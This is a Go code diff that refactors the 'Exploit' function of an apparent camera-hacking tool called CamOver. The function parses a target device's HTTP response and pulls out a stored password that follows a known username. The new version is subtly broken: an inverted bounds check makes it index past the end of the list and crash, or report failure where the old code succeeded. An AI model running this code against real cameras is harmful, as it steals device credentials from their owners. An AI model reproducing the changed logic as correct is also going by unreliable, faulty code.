@@ -6,7 +6,6 @@ import (
 	"io"
 	"net/http"
 	"regexp"
-	"strings"
 	"time"
 )
 
@@ -43,26 +42,27 @@ func (c *CamOver) Exploit(address string) (string, string, error) {
 
 	defer response.Body.Close()
 
+    if response.StatusCode != http.StatusOK {
+        return "", "", fmt.Errorf("unexpected status code: %d", response.StatusCode)
+    }
+
 	body, err := io.ReadAll(response.Body)
 	if err != nil {
 		return "", "", err
 	}
 
-	bodyString := string(body)
+	re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
+    matches := re.FindAllString(string(body), -1)
 
-	if response.StatusCode == http.StatusOK {
-		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
-		matches := re.FindAllString(bodyString, -1)
+    for idx, matche := range matches {
+        if matche == username {
+            if idx + 1 == len(matches) {
+                password := matches[idx + 1]
+                return username, password, nil
+            }
+            return "", "", fmt.Errorf("password not found after username")
+        }
+    }
 
-		for index, match := range matches {
-			if match == username {
-				if index+1 < len(matches) {
-					return username, matches[index+1], nil
-				}
-
-				return "", "", fmt.Errorf("password not found after username")
-			}
-		}
-	}
-	return "", "", fmt.Errorf("username not found or status code not 200")
+	return "", "", fmt.Errorf("username not found")
 }
